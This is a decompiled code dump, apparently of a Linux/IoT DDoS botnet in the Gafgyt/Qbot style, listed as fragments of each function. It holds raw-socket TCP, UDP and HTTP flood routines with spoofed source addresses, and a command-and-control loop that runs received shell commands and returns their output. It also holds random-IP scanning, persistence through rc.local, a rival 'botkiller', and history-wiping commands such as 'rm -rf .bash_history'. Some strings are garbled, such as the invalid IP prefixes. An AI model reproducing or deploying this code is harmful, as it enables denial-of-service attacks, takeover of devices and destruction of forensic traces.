        szprintf((int32_t)&v213, (int32_t)"203.210.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.11103.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.1103.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.177.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.176.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.170.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.171.%d.%d", (int32_t)v210);
        szprintf(v214, (int32_t)"1103.162.%d.%d", (int32_t)v210);
        szprintf(v214, (int32_t)"177.26.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.177.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.28.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.29.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.30.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.31.%d.%d", (int32_t)v210);
        szprintf(v215, (int32_t)"203.191.%d.%d", (int32_t)v210);
    return inet_addr(v215);
=================FUNCTION : main ===================
++++++++ FUNCTION START 21239
++++++++ FUNCTION END 22089
++++++++ FUNCTION LENGTH 850
    srand(v205 ^ __libc_getpid());
    init_rand(v206 ^ __libc_getpid());
    int32_t v207 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x1000b420
        v208 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        getcwd(v224, 256);
            __GI_fclose((int16_t *)v208);
                sprintf(v230, (int32_t)"\"%s%s\"\n", v224, v229 + v233, 0x10010000, v226, 0x10010000, (int32_t)&v232);
                while (true) {
                    while (true) {
                            fgets(v231, 1024, v208);
                            if (__GI_strcasecmp(v231, v230) == 0) {
                            __GI_fclose((int16_t *)v208);
                            int32_t v236 = __GI_fopen((int32_t)v209, (int32_t)&v235); // 0x1000b594
                                __GI_fclose((int16_t *)v236);
                            getOurIP();
                            v217 = __libc_fork();
                                if (__libc_fork() == 0) {
                                    zprintf((int32_t)"fork failed\n", 0x10010000);
                                while (true) {
                                    if (initConnection() != 0) {
                                        while (true) {
                                            if (initConnection() == 0) {
                                        v241 = getBuild(0x10030000);
                                        __GI_inet_ntoa(&v240, 0x10030000);
                                        sockprintf(v238, (int32_t)"BUILD %s:%s", v241);
                                        while (true) {
                                            while (true) {
                                                if (recvLine(v211, (char *)&v212, 0x1000, v221) == -1) {
                                                while (true) {
                                                                if (__libc_waitpid(v249, 0, 1) >= 1) {
                                                                    while (true) {
                                                                                while (true) {
                                                                                            free();
                                                        if (strstr(v221, "PING", 0x10010000) == v221) {
                                                            sockprintf(v211, (int32_t)"PONG", 0x10010000);
                                                            if (strstr(v221, "DUP", 0x10010000) == v221) {
                                                                zprintf((int32_t)"PEACE OUT IMMA DUP\n", 0x10010000);
                                                        while (true) {
                                                            if (initConnection() == 0) {
                                                        while (true) {
                                                        while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                    while (true) {
                                                                                    processCmd(v274, &v227);
                                                                                processCmd(v274, &v227);
                                                                            while (true) {
                                                                            free();
                                                                                free();
                                                                            while (true) {
                                                    if (__libc_waitpid(v249, 0, 1) < 1) {
                                    v241 = getBuild(0x10030000);
                                    __GI_inet_ntoa(&v240, 0x10030000);
                                    sockprintf(v238, (int32_t)"BUILD %s:%s", v241);
                                __libc_waitpid(v217, (int32_t)&v214, 0);
                                zprintf((int32_t)"fork failed\n", 0x10010000);
                            while (true) {
                                if (initConnection() == 0) {
            sprintf(v230, (int32_t)"\"%s%s\"\n", v224, v229 + v222, 0x10010000, v226, 0x10010000, (int32_t)&v232);
            while (true) {
        getOurIP();
        v217 = __libc_fork();
            if (__libc_fork() == 0) {
                zprintf((int32_t)"fork failed\n", 0x10010000);
            while (true) {
                if (initConnection() == 0) {
            __libc_waitpid(v217, (int32_t)&v214, 0);
            zprintf((int32_t)"fork failed\n", 0x10010000);
        while (true) {
            if (initConnection() == 0) {
    getOurIP();
    v217 = __libc_fork();
        if (__libc_fork() == 0) {
            zprintf((int32_t)"fork failed\n", 0x10010000);
        while (true) {
            if (initConnection() == 0) {
        __libc_waitpid(v217, (int32_t)&v214, 0);
        zprintf((int32_t)"fork failed\n", 0x10010000);
    while (true) {
        if (initConnection() == 0) {
    szprintf(v219, (int32_t)"%s 2>&1", v218);
    int32_t v283 = fdpopen(v219, "r"); // 0x1000bd00
    while (true) {
        if (fdgets(v219, 1024, v283) == 0) {
            fdpclose(v283);
            sockprintf(v211, (int32_t)"%s", v219);
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 44467
++++++++ FUNCTION END 45555
++++++++ FUNCTION LENGTH 1088
    int32_t v212 = __get_hosts_byname_r(a1, 2, (int32_t)a2, a3, a4, a5, a6); // 0x1000f164
                                        v241 = inet_aton((char *)a1);
                                        __open_nameservers();
                                        v242 = __dns_lookup((char *)a1, 1, v214, (int32_t)&v215, (int32_t)&v221, (int32_t)&v220);
                                            free();
                                            free();
                                                    while (true) {
                                            free();
                                                free();
                                                free();
                                            v241 = inet_aton((char *)a1);
                                            __open_nameservers();
                                            v242 = __dns_lookup((char *)a1, 1, v214, (int32_t)&v215, (int32_t)&v221, (int32_t)&v220);
                                                free();
                                                free();
                                                        while (true) {
                                                            free();
                                                                free();
                                                            free();
                                                free();
                                                    free();
                                                    free();
                            v241 = inet_aton((char *)a1);
                            __open_nameservers();
                            v242 = __dns_lookup((char *)a1, 1, v214, (int32_t)&v215, (int32_t)&v221, (int32_t)&v220);
                                free();
                                free();
                                        while (true) {
                                            free();
                                                free();
                                            free();
                                free();
                                    free();
                                    free();
                                v241 = inet_aton((char *)a1);
                                __open_nameservers();
                                v242 = __dns_lookup((char *)a1, 1, v214, (int32_t)&v215, (int32_t)&v221, (int32_t)&v220);
                                    free();
                                    free();
                                            while (true) {
                                                free();
                                                    free();
                                                free();
                                    free();
                                        free();
                                        free();
                        v241 = inet_aton((char *)a1);
                            __open_nameservers();
                            v242 = __dns_lookup((char *)a1, 1, v214, (int32_t)&v215, (int32_t)&v221, (int32_t)&v220);
                                    free();
                                    free();
                                            while (true) {
                                                free();
                                                    free();
                                                    free();
                                    free();
                                        free();
                                        free();
                            v241 = inet_aton((char *)a1);
                                __open_nameservers();
                                v242 = __dns_lookup((char *)a1, 1, v214, (int32_t)&v215, (int32_t)&v221, (int32_t)&v220);
                                        free();
                                        free();
                                                while (true) {
                                                    free();
                                                        free();
                                                        free();
                                        free();
                                            free();
                                            free();
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 68632
++++++++ FUNCTION END 69609
++++++++ FUNCTION LENGTH 977
                        while (true) {
                            while (true) {
                                    __libc_close(v226);
                                        if (inet_pton(10, (char *)v236, (int32_t)&v237) < 1) {
                                            inet_addr(v236);
                                        int32_t v240 = socket((int32_t)v239, 2, 17); // 0x10012614
                                            if (__libc_connect(v223, 28, 28) > -1) {
                                                __libc_send(v210, v207, result + v243, 0);
                                                    int32_t v244 = __libc_recv(v210, v207, 512, 0); // 0x10012694
                                                                                __libc_close(v212);
                                                                            free();
                                                                            free();
                                                                            while (true) {
                                                                                        __libc_close(v210);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                        free();
                                                                                                free();
                                                                                            free();
                                                                                        __libc_close(v210);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                        __libc_close(v210);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                    __libc_close(v210);
                                                                                        free();
                                                                                        free();
                                                                                    free();
                                                                            __libc_close(v210);
                                                                                free();
                                                                                free();
                                                                            free();
                                                                        __libc_close(v210);
                                                                            free();
                                                                            free();
                                                                        free();
                                                                        free();
                                                                        __libc_close(v212);
                                                                    free();
                                                                    free();
                                                                    __libc_close(v212);
                                                                free();
                                                                free();
                                __libc_close(v212);
                            free();
                            free();
                        __libc_close(v212);
                    free();
                    free();
                    __libc_close(v212);
                free();
                free();
                __libc_close(v212);
            free();
            free();
            __libc_close(v212);
        free();
        free();
        __libc_close(v212);
    free();
    free();
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 62108
++++++++ FUNCTION END 66091
++++++++ FUNCTION LENGTH 3983
            while (true) {
                while (true) {
                                    while (true) {
                                                                                    while (true) {
                                                                                                        while (true) {
                                                                                                    while (true) {
                                                                                                while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                                    while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                            while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                            while (true) {
        while (true) {
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 4959
++++++++ FUNCTION END 5484
++++++++ FUNCTION LENGTH 525
            v217 = __vfork();
                __libc_close(v214);
                __libc_close(v215);
                            __libc_close(v215);
                        __libc_close(v214);
                            __libc_close(v214);
                        __libc_close(v215);
                    __libc_close(v215);
                    __libc_close(v221);
        v218 = getdtablesize(0x10030000);
        v217 = __vfork();
            __libc_close(v214);
            __libc_close(v215);
                        __libc_close(v215);
                    __libc_close(v214);
                        __libc_close(v214);
                    __libc_close(v215);
                __libc_close(v215);
                __libc_close(v221);
        v217 = __vfork();
            __libc_close(v214);
            __libc_close(v215);
                        __libc_close(v215);
                    __libc_close(v214);
                        __libc_close(v214);
                    __libc_close(v215);
                __libc_close(v215);
                __libc_close(v221);
    v218 = getdtablesize(0x10030000);
    v217 = __vfork();
        __libc_close(v214);
        __libc_close(v215);
                    __libc_close(v215);
                __libc_close(v214);
                    __libc_close(v214);
                __libc_close(v215);
            __libc_close(v215);
            __libc_close(v221);
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 15586
++++++++ FUNCTION END 16054
++++++++ FUNCTION LENGTH 468
        rand_cmwc();
    int32_t result = getHost(a1, &v212, v211); // 0x10009688
    int32_t v213 = socket(2, 3, 6); // 0x100096c0
        result2 = sockprintf(v214, (int32_t)"Failed opening raw socket.", 0x10010000);
    if (__GI_setsockopt(v213, 0, 3, (int32_t)&v215, 4) > -1) {
        int32_t v222 = GetRandomIP(v216); // 0x100097e4
        *v221 = (int16_t)rand_cmwc();
        int32_t v224 = rand_cmwc(); // 0x1000982c
                while (true) {
                        if (__GI_strcoll(v239, (int32_t)"rst") == 0) {
                                    if (__GI_strcoll(v239, (int32_t)"psh") == 0) {
                                        sockprintf(v214, (int32_t)"Invalid flag \"%s\"", v238);
                rand_cmwc();
                    rand_cmwc();
                *v232 = (int16_t)tcpcsum(v219, v231, v220);
                while (true) {
                    __libc_sendto(v213, v219, v217, 0, v211, 16, v211);
                    v228 = GetRandomIP(v216);
                    *(int16_t *)(v219 | 4) = (int16_t)rand_cmwc();
                    *v225 = rand_cmwc();
                    *v221 = (int16_t)rand_cmwc();
                    *v232 = (int16_t)tcpcsum(v219, v231, v220);
        rand_cmwc();
            rand_cmwc();
        *v232 = (int16_t)tcpcsum(v219, v231, v220);
        while (true) {
            __libc_sendto(v213, v219, v217, 0, v211, 16, v211);
            v228 = GetRandomIP(v216);
            *(int16_t *)(v219 | 4) = (int16_t)rand_cmwc();
            *v225 = rand_cmwc();
            *v221 = (int16_t)rand_cmwc();
            *v232 = (int16_t)tcpcsum(v219, v231, v220);
        result2 = sockprintf(v214, (int32_t)"Failed setting raw headers mode.", 0x10010000);
=================FUNCTION : prints ===================
++++++++ FUNCTION START 2767
++++++++ FUNCTION END 3415
++++++++ FUNCTION LENGTH 648
                while (true) {
                    printchar((int32_t *)a1, v214);
                            printchar((int32_t *)a1, v214);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v221);
                        printchar((int32_t *)a1, v214);
                    printchar((int32_t *)a1, v214);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v221);
                printchar((int32_t *)a1, v214);
                while (true) {
                    printchar((int32_t *)a1, v214);
                            printchar((int32_t *)a1, v214);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v221);
                        printchar((int32_t *)a1, v214);
                    printchar((int32_t *)a1, v214);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v221);
                printchar((int32_t *)a1, v214);
            while (true) {
                printchar((int32_t *)a1, v214);
                        printchar((int32_t *)a1, v214);
            printchar((int32_t *)a1, (int32_t)*a2);
                printchar((int32_t *)a1, (int32_t)*v221);
                    printchar((int32_t *)a1, v214);
                printchar((int32_t *)a1, v214);
    printchar((int32_t *)a1, (int32_t)*a2);
        printchar((int32_t *)a1, (int32_t)*v221);
            printchar((int32_t *)a1, v214);
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 15160
++++++++ FUNCTION END 15583
++++++++ FUNCTION LENGTH 423
        rand_cmwc();
    int32_t result = getHost(a1, &v213, v212); // 0x10008ffc
        int32_t v216 = socket(2, 2, 17); // 0x10009044
            result3 = sockprintf(v214, (int32_t)"Failed opening raw socket.", 0x10010000);
                makeRandomStr(v217, a5);
                while (true) {
                    while (true) {
                        __libc_sendto(v216, v217, a5, 0, v212, 16, v212);
                                rand_cmwc();
    int32_t v223 = socket(2, 3, 17); // 0x100091c8
        if (__GI_setsockopt(v223, 0, 3, (int32_t)&v224, 4) > -1) {
                srand(v225 ^ rand_cmwc());
                init_rand(random());
            int32_t v230 = GetRandomIP(v226); // 0x10009348
            *v229 = (int16_t)rand_cmwc();
                v232 = rand_cmwc();
            makeRandomStr(v228 + 28, a5);
            while (true) {
                while (true) {
                    __libc_sendto(v223, v228, a5 + 28, 0, v212, 16, v212);
                    *v229 = (int16_t)rand_cmwc();
                        v244 = rand_cmwc();
                    *(int16_t *)(v228 | 4) = (int16_t)rand_cmwc();
                    *(int32_t *)(v228 | 12) = htonl(GetRandomIP(v226));
            result5 = sockprintf(v214, (int32_t)"Failed setting raw headers mode.", 0x10010000);
    result5 = sockprintf(v214, (int32_t)"Failed opening raw socket.", 0x10010000);
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 77986
++++++++ FUNCTION END 78658
++++++++ FUNCTION LENGTH 672
            while (true) {
                if (fgets(v214, v216, a1) != 0) {
                    __GI_fclose((int16_t *)a1);
                                v220 = __open_etc_hosts();
                                    while (true) {
                                        if (fgets(v214, v216, a1) != 0) {
                                            __GI_fclose((int16_t *)a1);
        while (true) {
            if (fgets(v214, v216, a1) != 0) {
                    while (true) {
                            while (true) {
                                        while (true) {
                                        while (true) {
                                            if (__GI_strcasecmp(a2, v250) == 0) {
                                            if (inet_pton(2, (char *)v252, v215) > 0) {
                                                    __GI_fclose((int16_t *)a1);
                                                if (inet_pton(10, (char *)v253, v213) > 0) {
                                                        __GI_fclose((int16_t *)a1);
                                __GI_fclose((int16_t *)a1);
                __GI_fclose((int16_t *)a1);
            __GI_fclose((int16_t *)a1);
                            v220 = __open_etc_hosts();
                                while (true) {
                                    if (fgets(v214, v216, a1) != 0) {
                                        __GI_fclose((int16_t *)a1);
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 34112
++++++++ FUNCTION END 35174
++++++++ FUNCTION LENGTH 1062
        while (true) {
                while (true) {
                    while (true) {
                                        while (true) {
                                            while (true) {
                                                while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                                                while (true) {
                                                            while (true) {
                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                while (true) {
                                                    while (true) {
                                                                    while (true) {
                                                            while (true) {
    while (true) {
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 20662
++++++++ FUNCTION END 21019
++++++++ FUNCTION LENGTH 357
    int32_t v212 = socket(2, 2, 0); // 0x1000b08c
    inet_addr((int32_t)"8.8.8.8");
    if (__libc_connect(v212, (int32_t)&v213, 16) == -1) {
    int32_t v217 = __GI_getsockname(v212, (int32_t)&v216, v215, v215); // 0x1000b158
        int32_t v218 = __libc_open((int32_t)"/proc/net/route", 0); // 0x1000b19c
        while (true) {
            if (fdgets(v220, 0x1000, v218) != 0) {
                if (strstr(v220, "\t00000000\t", 0x10010000) != 0) {
                        __libc_close(v218);
                            __libc_close(v212);
                        __libc_close(v212);
                    __libc_close(v218);
                        __libc_close(v212);
                    __libc_close(v212);
            __libc_close(v218);
                __libc_close(v212);
            __libc_close(v212);
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 54733
++++++++ FUNCTION END 55251
++++++++ FUNCTION LENGTH 518
                if (__GI_sigprocmask(0, (int32_t)&v219, v224) == 0) {
                            __GI_sigprocmask(2, v224, 0);
                            __GI_sigprocmask(2, v224, 0);
                            __GI_sigprocmask(2, v224, 0);
                        __GI_sigprocmask(2, v224, 0);
                        __GI_sigprocmask(2, v224, 0);
                        __GI_sigprocmask(2, v224, 0);
            if (__GI_sigprocmask(0, (int32_t)&v219, v224) == 0) {
                        __GI_sigprocmask(2, v224, 0);
                        __GI_sigprocmask(2, v224, 0);
                        __GI_sigprocmask(2, v224, 0);
                    __GI_sigprocmask(2, v224, 0);
                    __GI_sigprocmask(2, v224, 0);
                    __GI_sigprocmask(2, v224, 0);
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 69612
++++++++ FUNCTION END 70049
++++++++ FUNCTION LENGTH 437
    int32_t v210 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v209); // 0x10012aa8
        int32_t v214 = __GI_fopen((int32_t)"/etc/config/resolv.conf", v213); // 0x10012ac0
    while (true) {
        if (fgets(v216, 128, v212) == 0) {
            __GI_fclose((int16_t *)v211);
            while (true) {
                                while (true) {
                                        while (true) {
                                            while (true) {
                                                while (true) {
                                                free();
                                                    free();
                                                while (true) {
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 29811
++++++++ FUNCTION END 30608
++++++++ FUNCTION LENGTH 797
            if (__libc_open(a1, v219) < 0) {
                    free();
                free();
                        free();
            if (__libc_open(a1, v219) < 0) {
                    free();
                            free();
                free();
                free();
        if (__libc_open(a1, v219) < 0) {
                free();
                        free();
            free();
=================FUNCTION : _init ===================
++++++++ FUNCTION START 314
++++++++ FUNCTION END 675
++++++++ FUNCTION LENGTH 361
        "etrbhhgetrb",
        "wget",
        "botnet",
        "swatnet",
        "fucknet",
        "cracknet",
        "weednet",
        "gaynet",
        "queernet",
        "ballnet",
        "unet",
        "/dev/netslink/",
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 14492
++++++++ FUNCTION END 14904
++++++++ FUNCTION LENGTH 412
    srand(v211 ^ rand_cmwc());
        while (true) {
        while (true) {
                    GetRandomPublicIP(v226);
                                socket(2, 1, 0);
                                    if (__libc_connect(*v225, (int32_t)&v212, 16) == -1) {
                socket(2, 1, 0);
        while (true) {
        while (true) {
    while (true) {
    while (true) {
=================FUNCTION : print ===================
++++++++ FUNCTION START 3746
++++++++ FUNCTION END 4298
++++++++ FUNCTION LENGTH 552
    while (true) {
                    printchar(a1, (int32_t)*v217);
                        while (true) {
                            while (true) {
                                result2 = prints(v213, v237, v226, v222) + result;
                                    int32_t v240 = printi(v213, v239, 10, 1, v226, v222, 97) + result; // 0x10000cb0
                                        int32_t v242 = printi(v213, v241, 16, 0, v226, v222, 97) + result; // 0x10000d64
                                            int32_t v244 = printi(v213, v243, 16, 0, v226, v222, 65) + result; // 0x10000e18
                                                int32_t v246 = printi(v213, v245, 10, 0, v226, v222, 97) + result; // 0x10000ecc
                                                    int32_t v248 = prints(v213, (char *)&v216, v226, v222); // 0x10000f7c
            printchar(a1, (int32_t)*v217);
=================FUNCTION : __heap_free ===================
++++++++ FUNCTION START 50530
++++++++ FUNCTION END 50875
++++++++ FUNCTION LENGTH 345
            __heap_link_free_area((int32_t *)v212, result, v213, result3);
            __heap_link_free_area((int32_t *)v212, result, v213, result3);
                    __heap_link_free_area_after(a1, v217, v222, v215);
                    __heap_link_free_area_after(a1, result2, v216, v215);
            __heap_link_free_area(a1, v221, v216, result2);
    while (true) {
                        __heap_link_free_area_after(a1, v217, v222, v215);
                        __heap_link_free_area_after(a1, result2, v216, v215);
                __heap_link_free_area(a1, v221, v216, result2);
    __heap_link_free_area((int32_t *)v212, result, v213, result3);
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 75111
++++++++ FUNCTION END 75729
++++++++ FUNCTION LENGTH 618
        inet_pton4(v212, a3);
                                while (true) {
                                while (true) {
            while (true) {
                while (true) {
                            if (inet_pton4(v219, v217) > 0) {
                                        while (true) {
                                                        while (true) {
                                                        while (true) {
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 76000
++++++++ FUNCTION END 76590
++++++++ FUNCTION LENGTH 590
        return inet_ntop4(a2, a3, a4);
        while (true) {
            while (true) {
                                        if (inet_ntop4(a2 + 12, v252, v253 - v252 + 86) == 0) {
                                v250 = sprintf(v252, (int32_t)"%x", v249, v213, v245, v246, v213, (int32_t)&v251);
                            if (inet_ntop4(a2 + 12, v252, v253 - v252 + 86) == 0) {
                v250 = sprintf(v247, (int32_t)"%x", v249, v213, v245, v246, v213, (int32_t)&v251);
                while (true) {
        while (true) {
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 56600
++++++++ FUNCTION END 56991
++++++++ FUNCTION LENGTH 391
            v226 = getuid(0x10030000);
            v224 = geteuid();
                v227 = getgid(v224);
                if (v227 == getegid()) {
    while (true) {
        v226 = getuid(0x10030000);
        v224 = geteuid();
            v227 = getgid(v224);
            if (v227 == getegid()) {
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 6976
++++++++ FUNCTION END 7257
++++++++ FUNCTION LENGTH 281
    int32_t v212 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001b6c
    while (true) {
        if (fdgets(v214, 0x1000, v212) == 0) {
            __libc_close(v212);
        uppercase((char *)&v213);
        if (strstr(v214, "BOGOMIPS", 0x10010000) == v214) {
            while (true) {
                            while (true) {
                                        __libc_close(v212);
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 16513
++++++++ FUNCTION END 16793
++++++++ FUNCTION LENGTH 280
    random();
    int32_t v213 = random() % 7; // 0x10009ec0
    int32_t result = sprintf(v215, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", a2, a4, v216, v217, 0x10010000, v213); // 0x10009fe4
    while (true) {
        if (__libc_fork() != 0) {
                while (true) {
                    int32_t v220 = socket_connect(a1, a3); // 0x10009f4c
                        __libc_close(v221);
=================FUNCTION : printi ===================
++++++++ FUNCTION START 3418
++++++++ FUNCTION END 3743
++++++++ FUNCTION LENGTH 325
        result2 = prints(a1, (char *)&v212, a5, a6);
            while (true) {
                        printchar((int32_t *)a1, 45);
                        result = prints(a1, v216, a5 - 1, a6);
            result = prints(a1, v217, a5, a6);
                    printchar((int32_t *)a1, 45);
                    result = prints(a1, v216, a5 - 1, a6);
        result2 = prints(a1, v217, a5, a6);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 7728
++++++++ FUNCTION END 8077
++++++++ FUNCTION LENGTH 349
            while (true) {
                sockprintf(v222, (int32_t)"PING", 0x10010000);
                while (true) {
                        while (true) {
                            if (__libc_recv(v222, (int32_t)&v228, 1, 0) != 1) {
                        while (true) {
    while (true) {
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 10641
++++++++ FUNCTION END 10907
++++++++ FUNCTION LENGTH 266
        __libc_send(a1, v215, 1, 0x4000);
                __libc_send(a1, v215, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v215, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v215, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 14907
++++++++ FUNCTION END 15157
++++++++ FUNCTION LENGTH 250
    int32_t v212 = socket(2, 2, 0); // 0x10008de8
    int32_t v214 = __GI_gethostbyname(a1); // 0x10008e0c
    while (true) {
        random();
            __libc_send(v212, v223, 65, 0);
            __libc_connect(v212, v216, 16);
                __libc_close(v212);
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 5487
++++++++ FUNCTION END 5752
++++++++ FUNCTION LENGTH 265
    __libc_close(a1);
    __GI_sigprocmask(0, v214, v216);
    while (true) {
        if (__libc_waitpid(v218, (int32_t)&v217, 0) == -1) {
        __GI_sigprocmask(2, v216, 0);
    __GI_sigprocmask(2, v216, 0);
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 7260
++++++++ FUNCTION END 7497
++++++++ FUNCTION LENGTH 237
    int32_t v212 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001d88
    while (true) {
        if (fdgets(v214, 0x1000, v212) == 0) {
            __libc_close(v212);
        uppercase((char *)&v213);
        if (strstr(v214, "BOGOMIPS", 0x10010000) == v214) {
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 52487
++++++++ FUNCTION END 52789
++++++++ FUNCTION LENGTH 302
                while (true) {
                        __GI_random_r((int32_t *)v214, (int32_t)&v215);
                            __GI_random_r((int32_t *)v214, (int32_t)&v215);
            __GI_random_r((int32_t *)v214, (int32_t)&v215);
                __GI_random_r((int32_t *)v214, (int32_t)&v215);
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 36163
++++++++ FUNCTION END 36500
++++++++ FUNCTION LENGTH 337
            while (true) {
        _stdio_openlist_dec_use();
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 11196
++++++++ FUNCTION END 11521
++++++++ FUNCTION LENGTH 325
        while (true) {
            while (true) {
                    int32_t v220 = __libc_recv(a1, v219, 1, 0); // 0x10003038
                                if (strstr(a6, (char *)a2, v219) != 0) {
                            int32_t v224 = __libc_recv(a1, v219 + 1, 2, 0); // 0x100030a8
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 40083
++++++++ FUNCTION END 40432
++++++++ FUNCTION LENGTH 349
    while (true) {
    while (true) {
                while (true) {
    while (true) {
    while (true) {
=================FUNCTION : getcwd ===================
++++++++ FUNCTION START 24206
++++++++ FUNCTION END 24589
++++++++ FUNCTION LENGTH 383
            __GI_getpagesize();
                        free();
                free();
            free();
=================FUNCTION : __GI_memchr ===================
++++++++ FUNCTION START 66934
++++++++ FUNCTION END 67271
++++++++ FUNCTION LENGTH 337
        while (true) {
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 10110
++++++++ FUNCTION END 10391
++++++++ FUNCTION LENGTH 281
    if (getHost(a2, &v214, v213) != 0) {
    if (__libc_connect(a1, v213, 16) > -1) {
        while (true) {
                getsockopt(a1, 1, 4, (int32_t)&v224, (int32_t)&v223);
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 32060
++++++++ FUNCTION END 32986
++++++++ FUNCTION LENGTH 926
    while (true) {
        while (true) {
                            while (true) {
                                            while (true) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 14240
++++++++ FUNCTION END 14489
++++++++ FUNCTION LENGTH 249
    if (__GI_gethostbyname(a1) == 0) {
    int32_t v218 = socket(2, 1, 6); // 0x10007cec
    __GI_setsockopt(v218, 6, 1, (int32_t)&v212, 4);
    if (__libc_connect(v218, v214, 16) == -1) {
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 16057
++++++++ FUNCTION END 16291
++++++++ FUNCTION LENGTH 234
    while (true) {
            __libc_system(v212);
            __libc_system(v212);
=================FUNCTION : ClearHistory ===================
++++++++ FUNCTION START 16294
++++++++ FUNCTION END 16510
++++++++ FUNCTION LENGTH 216
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 20408
++++++++ FUNCTION END 20659
++++++++ FUNCTION LENGTH 251
        __libc_close(v213);
    int32_t v220 = socket(2, 1, 0); // 0x1000affc
    return connectTimeout(v220, v211, v218, 30, v211) == 0;
=================FUNCTION : realloc ===================
++++++++ FUNCTION START 49246
++++++++ FUNCTION END 49527
++++++++ FUNCTION LENGTH 281
        free();
            __heap_free(&v216, v214 + v212, v217 - v214);
        free();
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 10394
++++++++ FUNCTION END 10638
++++++++ FUNCTION LENGTH 244
    int32_t result = __libc_fork(); // 0x100029e4
    while (true) {
                free();
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 53732
++++++++ FUNCTION END 54218
++++++++ FUNCTION LENGTH 486
    while (true) {
